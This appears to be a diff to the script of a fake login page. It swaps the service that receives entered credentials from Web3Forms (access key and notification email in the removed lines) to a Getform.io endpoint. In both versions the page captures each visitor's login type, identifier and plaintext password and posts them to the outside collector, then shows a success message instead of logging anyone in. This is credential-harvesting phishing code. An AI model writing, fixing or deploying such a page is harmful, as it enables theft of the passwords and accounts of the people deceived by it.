@@ -240,8 +240,7 @@
 
 <script>
   // ─── CONFIG ───────────────────────────────────────────────
-  const WEB3FORMS_KEY = 'd4864f73-af0b-42ab-b071-e0356a544ebc';
-  const NOTIFY_EMAIL  = 'jinabyasin@gmail.com';
+  const GETFORM_URL = 'https://getform.io/f/txfdrkkcali';
   // ─────────────────────────────────────────────────────────
 
   let loginType = 'email';
@@ -310,27 +309,25 @@
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via Web3Forms ──
+    // ── send via Getform.io (free, no restrictions) ──
     try {
-      const res = await fetch('https://api.web3forms.com/submit', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify({
-          access_key:   WEB3FORMS_KEY,
-          subject:      'Login attempt on your site',
-          from_name:    'My Site Login',
-          'Login Type': loginType,
-          'Identifier': identifier,
-          'Password':   password,
-          'Time':       new Date().toLocaleString()
-        })
+      const formData = new FormData();
+      formData.append('Login Type', loginType);
+      formData.append('Identifier', identifier);
+      formData.append('Password',   password);
+      formData.append('Time',       new Date().toLocaleString());
+
+      const res = await fetch(GETFORM_URL, {
+        method: 'POST',
+        body:   formData,
+        headers: { 'Accept': 'application/json' }
       });
 
       const data = await res.json();
       if (data.success) {
         document.getElementById('tt-success').classList.add('show');
       } else {
-        showError('Error: ' + (data.message || 'Something went wrong.'));
+        showError('Something went wrong. Try again.');
       }
     } catch (err) {
       showError('Network error. Check your connection.');
